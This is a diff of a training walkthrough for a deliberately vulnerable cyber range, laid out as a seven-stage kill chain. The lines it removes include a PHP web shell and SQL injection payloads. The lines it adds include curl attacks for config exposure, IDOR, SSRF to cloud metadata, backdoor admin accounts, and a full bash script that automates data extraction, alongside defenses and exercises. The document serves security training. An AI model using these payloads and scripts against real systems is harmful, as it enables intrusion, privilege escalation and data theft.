@@ -3,258 +3,415 @@
 ## Overview
 This document outlines the complete cyber kill chain demonstration using the W Corp cyber range environment. The kill chain follows the traditional 7-stage model and demonstrates how attackers can exploit multiple vulnerabilities to achieve their objectives.
 
+## Application Structure
+
+- **Root URL:** `http://your-server/` - Landing page explaining the cyber range
+- **Training Environment:** `http://your-server/wcorp/` - Main vulnerable application
+- **API Endpoints:** `http://your-server/wcorp/api/*` - Backend API with vulnerabilities
+
 ## Cyber Kill Chain Stages
 
 ### 1. Reconnaissance
 **Objective:** Gather information about the target system
 
 **Techniques Demonstrated:**
+
+- **Configuration Exposure:** `http://localhost:3000/.env`
+  - Reveals database credentials
+  - Exposes JWT secrets
+  - Shows internal configuration
+
+- **Package Information:** `http://localhost:3000/package.json`
+  - Reveals technology stack
+  - Shows dependency versions
+  - Identifies potential vulnerabilities in packages
+
 - **robots.txt Analysis:** `http://localhost:3000/robots.txt`
   - Reveals directory structure and sensitive paths
-  - Exposes `/admin/`, `/api/`, `/uploads/`, `/php/`, `/config/`, `/backup/`
-  
-- **HTML Source Code Analysis:** `http://localhost:3000/`
-  - Comments reveal internal information
-  - Database credentials and system architecture exposed
-  
+  - Exposes `/admin/`, `/api/`, `/uploads/`
+
 - **Sitemap Analysis:** `http://localhost:3000/sitemap.xml`
   - Complete application structure mapped
-  - API endpoints and sensitive files identified
-  
-- **Directory Enumeration:** `http://localhost:8080/`
-  - PHP legacy system discovered
-  - Vulnerable components identified
+  - API endpoints identified
+
+- **HTML Source Code Analysis:** `http://localhost:3000/wcorp/`
+  - Comments may reveal internal information
+  - JavaScript files expose API endpoints
+  - React source maps reveal application structure
 
 **Tools Used:**
-- Web browser
+- Web browser developer tools
 - curl/wget for automated reconnaissance
-- Directory enumeration tools
+- Burp Suite for request interception
+
+**Example Commands:**
+```bash
+# Gather basic information
+curl http://localhost:3000/robots.txt
+curl http://localhost:3000/sitemap.xml
+curl http://localhost:3000/.env
+curl http://localhost:3000/package.json
+
+# Enumerate API endpoints
+curl http://localhost:3000/wcorp/api/
+```
 
 ### 2. Weaponization
-**Objective:** Create malicious payloads for exploitation
+**Objective:** Create attack vectors based on discovered vulnerabilities
 
-**Payloads Created:**
-- **SQL Injection Payloads:**
-  ```sql
-  admin' OR '1'='1' --
-  admin' UNION SELECT 1,2,3,4,5,6,7 --
-  admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users --
+**Attack Vectors Prepared:**
+
+- **Authentication Bypass Payloads:**
+  - Brute force credential lists
+  - Default password attempts
+  - Session hijacking techniques
+
+- **IDOR Exploitation Parameters:**
+  ```
+  /wcorp/api/user/profile/1
+  /wcorp/api/user/profile/2
+  /wcorp/api/user/sensitive/1
   ```
 
-- **Web Shell Payload:**
-  ```php
-  <?php
-  if (isset($_GET['cmd'])) {
-      echo "<pre>";
-      system($_GET['cmd']);
-      echo "</pre>";
-  }
-  ?>
+- **Parameter Tampering Payloads:**
+  ```json
+  {"username":"attacker","password":"test","role":"admin"}
+  {"id":1,"isAdmin":true}
   ```
 
 - **SSRF Payloads:**
   ```
-  http://localhost:3000/.env
-  http://localhost:3000/package.json
+  http://localhost:3306
+  http://169.254.169.254/latest/meta-data/
   file:///etc/passwd
   ```
 
 ### 3. Delivery
-**Objective:** Deliver malicious payloads to the target
+**Objective:** Deploy weaponized payloads to the target
 
-**Delivery Vectors:**
-- **File Upload Vulnerability:** `http://localhost:8080/upload.php`
-  - Upload web shell through vulnerable form
-  - No file type validation or restrictions
-  
-- **SQL Injection:** `http://localhost:8080/login.php`
-  - Inject malicious SQL through login form
-  - Bypass authentication and extract data
+**Delivery Methods:**
+
+- **Direct API Calls:**
+  ```bash
+  # Authentication attempt
+  curl -X POST http://localhost:3000/wcorp/api/login \
+    -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"admin123"}'
+  ```
+
+- **Malicious File Uploads:**
+  ```bash
+  # Upload potentially malicious file
+  curl -X POST http://localhost:3000/wcorp/api/upload \
+    -F "file=@malicious.txt" \
+    -H "Authorization: Bearer <token>"
+  ```
+
+- **SSRF Requests:**
+  ```bash
+  # Attempt to access internal resources
+  curl "http://localhost:3000/wcorp/api/fetch-url?url=http://localhost:3306"
+  ```
 
 ### 4. Exploitation
-**Objective:** Execute malicious code and gain initial access
+**Objective:** Actively exploit discovered vulnerabilities
 
-**Exploitation Techniques:**
-- **SQL Injection Exploitation:**
-  - Bypass authentication: `admin' OR '1'='1' --`
-  - Extract user credentials and sensitive data
-  - Enumerate database schema
-  
-- **Web Shell Execution:**
-  - Access uploaded shell: `http://localhost:8080/uploads/shell.php`
-  - Execute system commands: `?cmd=whoami`
-  - Gain remote command execution
+**Exploits Executed:**
+
+**A. Broken Authentication:**
+```bash
+# Successful login with default credentials
+curl -X POST http://localhost:3000/wcorp/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"admin123"}'
+
+# Response includes JWT token
+# TOKEN=$(echo $response | jq -r '.token')
+```
+
+**B. Broken Access Control (IDOR):**
+```bash
+# Access admin profile as regular user
+curl -H "Authorization: Bearer <token>" \
+  http://localhost:3000/wcorp/api/user/profile/1
+
+# Access sensitive data
+curl -H "Authorization: Bearer <token>" \
+  http://localhost:3000/wcorp/api/user/sensitive/1
+
+# Access internal notes
+curl -H "Authorization: Bearer <token>" \
+  http://localhost:3000/wcorp/api/user/notes/1
+```
+
+**C. Security Misconfiguration:**
+```bash
+# Access exposed configuration
+curl http://localhost:3000/.env
+
+# Reveals:
+# - DB_PASSWORD
+# - JWT_SECRET
+# - Database connection details
+```
+
+**D. Cryptographic Failures:**
+```bash
+# Query database to see plain text passwords
+# (requires database access obtained through other means)
+mysql -h localhost -u wcorp_user -p wcorp_db \
+  -e "SELECT username, password FROM users;"
+```
+
+**E. SSRF Exploitation:**
+```bash
+# Access internal services
+curl "http://localhost:3000/wcorp/api/fetch-url?url=http://localhost:3306"
+
+# Attempt cloud metadata access (if deployed on cloud)
+curl "http://localhost:3000/wcorp/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"
+```
 
 ### 5. Installation
-**Objective:** Establish persistent access
+**Objective:** Establish persistent access to the system
 
 **Persistence Techniques:**
-- **Web Shell Persistence:**
-  - Maintain access through uploaded web shell
-  - Create additional backdoors if needed
-  
-- **Session Hijacking:**
-  - Exploit predictable session tokens
-  - Maintain access through stolen sessions
 
-### 6. Command & Control (C2)
-**Objective:** Establish communication channel for remote control
+**A. Create Backdoor Account:**
+```bash
+# Register new admin account through parameter tampering
+curl -X POST http://localhost:3000/wcorp/api/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"backdoor","password":"secret","email":"backdoor@test.com","role":"admin"}'
+```
 
-**C2 Channels:**
-- **Web Shell C2:**
-  - Use web shell for command execution
-  - Maintain persistent access
-  - Execute reconnaissance commands
-  
-- **SSRF C2:**
-  - Use SSRF vulnerability for internal network access
-  - Exfiltrate data through SSRF endpoints
+**B. Session Persistence:**
+```bash
+# Store valid authentication tokens
+# Exploit long session timeouts
+# Use discovered JWT secret to forge tokens
+```
+
+**C. Upload Backdoor Files:**
+```bash
+# Upload files to accessible uploads directory
+curl -X POST http://localhost:3000/wcorp/api/upload \
+  -F "file=@backdoor.html" \
+  -H "Authorization: Bearer <token>"
+
+# Access at http://localhost:3000/uploads/backdoor.html
+```
+
+### 6. Command & Control
+**Objective:** Maintain communication and control over compromised assets
+
+**C2 Techniques:**
+
+**A. Administrative Access:**
+```bash
+# Use compromised admin credentials
+# Access admin panel
+curl -H "Authorization: Bearer <admin-token>" \
+  http://localhost:3000/wcorp/admin
+```
+
+**B. API Abuse:**
+```bash
+# Use admin API endpoints
+curl -H "Authorization: Bearer <admin-token>" \
+  http://localhost:3000/wcorp/api/admin/users
+
+curl -H "Authorization: Bearer <admin-token>" \
+  http://localhost:3000/wcorp/api/admin/stats
+```
+
+**C. SSRF for Internal Access:**
+```bash
+# Use SSRF to pivot to internal network
+curl "http://localhost:3000/wcorp/api/fetch-url?url=http://internal-service:8080"
+```
 
 ### 7. Actions on Objectives
-**Objective:** Achieve the attacker's ultimate goals
+**Objective:** Achieve the ultimate goal of the attack
 
 **Objectives Achieved:**
-- **Data Exfiltration:**
-  - Extract user credentials and personal information
-  - Access sensitive data through IDOR vulnerabilities
-  - Download database dumps
-  
-- **System Compromise:**
-  - Gain administrative access
-  - Modify system configurations
-  - Install additional malware
 
-## Complete Attack Scenario
+**A. Complete Data Exfiltration:**
+```bash
+# Extract all user data
+curl -H "Authorization: Bearer <admin-token>" \
+  http://localhost:3000/wcorp/api/admin/users > users.json
 
-### Step-by-Step Attack Flow
+# Extract sensitive information
+for id in {1..10}; do
+  curl -H "Authorization: Bearer <token>" \
+    http://localhost:3000/wcorp/api/user/sensitive/$id >> sensitive_data.json
+done
+```
 
-1. **Initial Reconnaissance**
-   ```bash
-   curl http://localhost:3000/robots.txt
-   curl http://localhost:3000/sitemap.xml
-   ```
+**B. Database Compromise:**
+```bash
+# Using credentials from .env exposure
+mysqldump -h localhost -u wcorp_user -p<password> wcorp_db > database_dump.sql
 
-2. **Vulnerability Discovery**
-   - Identify SQL injection in PHP login form
-   - Discover unrestricted file upload
-   - Find IDOR vulnerabilities in API endpoints
+# Extract specific tables
+mysql -h localhost -u wcorp_user -p<password> wcorp_db \
+  -e "SELECT * FROM users;" > all_users.csv
+```
 
-3. **Authentication Bypass**
-   ```sql
-   Username: admin' OR '1'='1' --
-   Password: anything
-   ```
+**C. Privilege Escalation:**
+```bash
+# Modify own user role to admin
+curl -X POST http://localhost:3000/wcorp/api/user/update \
+  -H "Authorization: Bearer <token>" \
+  -H "Content-Type: application/json" \
+  -d '{"id":5,"role":"admin"}'
+```
 
-4. **Data Extraction**
-   ```sql
-   Username: admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users --
-   Password: anything
-   ```
+**D. System Reconnaissance:**
+```bash
+# Use SSRF to map internal network
+for port in 22 80 443 3306 5432 6379 8080; do
+  curl "http://localhost:3000/wcorp/api/fetch-url?url=http://localhost:$port"
+done
+```
 
-5. **Web Shell Upload**
-   - Create `shell.php` with web shell code
-   - Upload through vulnerable form
-   - Access at `http://localhost:8080/uploads/shell.php`
+## Complete Attack Chain Example
 
-6. **System Compromise**
-   ```bash
-   # Through web shell
-   ?cmd=whoami
-   ?cmd=ls -la
-   ?cmd=cat /etc/passwd
-   ```
+### Scenario: External Attacker to Full System Compromise
 
-7. **Data Exfiltration**
-   ```bash
-   # Database dump
-   ?cmd=mysqldump -u wcorp_user -pwcorp_pass wcorp_db
-   
-   # Access sensitive files
-   ?cmd=cat /var/www/html/.env
-   ```
+```bash
+#!/bin/bash
+# Complete attack automation script
 
-8. **Lateral Movement**
-   - Use IDOR to access other user profiles
-   - Extract sensitive data from internal notes
-   - Access admin functionality
+TARGET="http://localhost:3000"
 
-## Vulnerabilities Exploited
+echo "[*] Stage 1: Reconnaissance"
+curl -s $TARGET/robots.txt
+curl -s $TARGET/.env > exposed_env.json
+curl -s $TARGET/package.json > package.json
 
-### OWASP Top 10 Vulnerabilities
+echo "[*] Stage 2: Weaponization"
+# Prepare payloads based on reconnaissance
+DB_PASSWORD=$(grep DB_PASSWORD exposed_env.json | cut -d'"' -f4)
+JWT_SECRET=$(grep JWT_SECRET exposed_env.json | cut -d'"' -f4)
 
-1. **A01 - Broken Access Control (IDOR)**
-   - `/api/user/profile/:id` - No authorization checks
-   - `/api/user/sensitive/:id` - Sensitive data exposure
-   - `/api/user/notes/:id` - Internal notes exposure
+echo "[*] Stage 3: Delivery & Exploitation"
+# Login with default credentials
+TOKEN=$(curl -s -X POST $TARGET/wcorp/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')
 
-2. **A02 - Cryptographic Failures**
-   - Passwords stored in plain text
-   - No password hashing or encryption
+echo "[*] Token obtained: $TOKEN"
 
-3. **A03 - Injection (SQL Injection)**
-   - Raw SQL queries without prepared statements
-   - User input directly concatenated into SQL
+echo "[*] Stage 4: IDOR Exploitation"
+# Access all user profiles
+for id in {1..10}; do
+  curl -s -H "Authorization: Bearer $TOKEN" \
+    $TARGET/wcorp/api/user/profile/$id >> all_profiles.json
+done
 
-4. **A05 - Security Misconfiguration**
-   - Exposed environment files
-   - Exposed configuration files
-   - Weak file permissions
+echo "[*] Stage 5: Sensitive Data Extraction"
+# Extract sensitive information
+for id in {1..10}; do
+  curl -s -H "Authorization: Bearer $TOKEN" \
+    $TARGET/wcorp/api/user/sensitive/$id >> sensitive.json
+done
 
-5. **A07 - Identification and Authentication Failures**
-   - Predictable session tokens
-   - No rate limiting on login attempts
-   - Weak authentication mechanisms
+echo "[*] Stage 6: Admin Access"
+# Access admin endpoints
+curl -s -H "Authorization: Bearer $TOKEN" \
+  $TARGET/wcorp/api/admin/users > all_users.json
 
-6. **A08 - Software and Data Integrity Failures**
-   - Unrestricted file upload
-   - No file type validation
-   - No virus scanning
+curl -s -H "Authorization: Bearer $TOKEN" \
+  $TARGET/wcorp/api/admin/stats > stats.json
 
-7. **A10 - Server-Side Request Forgery (SSRF)**
-   - No URL validation in fetch endpoint
-   - Internal network access possible
+echo "[*] Stage 7: Data Exfiltration Complete"
+# Compress and exfiltrate
+tar -czf exfiltrated_data.tar.gz *.json
+echo "[*] Attack chain complete! Data saved to exfiltrated_data.tar.gz"
+```
 
-## Mitigation Strategies
+## Defense Strategies
 
-### For Each Vulnerability
+### How to Prevent Each Stage
 
-1. **A01 - Broken Access Control**
-   - Implement proper authorization checks
-   - Use role-based access control (RBAC)
-   - Validate user permissions for each request
+**1. Reconnaissance Prevention:**
+- Remove or restrict access to configuration files
+- Disable directory listing
+- Remove sensitive comments from code
+- Implement proper robots.txt without exposing sensitive paths
+- Use security headers to prevent information disclosure
 
-2. **A02 - Cryptographic Failures**
-   - Use strong password hashing (bcrypt, Argon2)
-   - Implement proper key management
-   - Use HTTPS for all communications
+**2. Weaponization Mitigation:**
+- Strong password policies
+- Multi-factor authentication
+- Rate limiting on authentication endpoints
+- Input validation and sanitization
 
-3. **A03 - Injection**
-   - Use prepared statements
-   - Implement input validation
-   - Use parameterized queries
+**3. Delivery Prevention:**
+- Web Application Firewall (WAF)
+- Input validation on all endpoints
+- Content Security Policy (CSP)
+- File upload restrictions
 
-4. **A05 - Security Misconfiguration**
-   - Remove sensitive files from web root
-   - Implement proper access controls
-   - Use security headers
+**4. Exploitation Prevention:**
+- Proper authorization checks
+- Password hashing (bcrypt, Argon2)
+- Parameterized queries for SQL
+- Session management best practices
+- SSRF prevention through URL validation
 
-5. **A07 - Authentication Failures**
-   - Implement rate limiting
-   - Use secure session management
-   - Implement multi-factor authentication
+**5. Installation Prevention:**
+- Principle of least privilege
+- File integrity monitoring
+- Disable unnecessary file uploads
+- Regular security audits
 
-6. **A08 - Data Integrity Failures**
-   - Implement file type validation
-   - Use virus scanning
-   - Implement file size limits
+**6. Command & Control Prevention:**
+- Network segmentation
+- Egress filtering
+- Anomaly detection
+- Session timeout policies
 
-7. **A10 - SSRF**
-   - Implement URL validation
-   - Use allowlists for internal resources
-   - Implement network segmentation
+**7. Actions on Objectives Prevention:**
+- Data loss prevention (DLP)
+- Database encryption
+- Access logging and monitoring
+- Regular security assessments
+
+## Training Exercises
+
+### Exercise 1: Basic Reconnaissance
+1. Discover all publicly accessible endpoints
+2. Extract configuration information
+3. Map the application structure
+
+### Exercise 2: Authentication Bypass
+1. Identify authentication mechanisms
+2. Test default credentials
+3. Exploit weak authentication
+
+### Exercise 3: IDOR Attack Chain
+1. Login as a regular user
+2. Enumerate user IDs
+3. Access admin and other user data
+
+### Exercise 4: Complete Kill Chain
+1. Perform full reconnaissance
+2. Exploit multiple vulnerabilities
+3. Establish persistence
+4. Extract sensitive data
 
 ## Conclusion
 
-This cyber range successfully demonstrates a complete cyber kill chain using multiple OWASP Top 10 vulnerabilities. The environment provides a realistic scenario for security training and vulnerability assessment. The attack flow shows how seemingly minor vulnerabilities can be chained together to achieve significant system compromise.
+This cyber range demonstrates how multiple small vulnerabilities can be chained together to achieve complete system compromise. Each stage of the kill chain builds upon the previous one, showing the importance of defense in depth and comprehensive security practices.
 
-The key takeaway is that security is only as strong as the weakest link. A comprehensive security program must address all potential attack vectors and implement defense in depth strategies.
+**Key Takeaways:**
+- No single vulnerability should exist in isolation
+- Defense must address each kill chain stage
+- Layered security controls are essential
+- Regular security testing is crucial
+- Security awareness training is vital
+
+**Remember:** This environment is for educational purposes only. Always practice ethical hacking and obtain proper authorization before testing any systems.
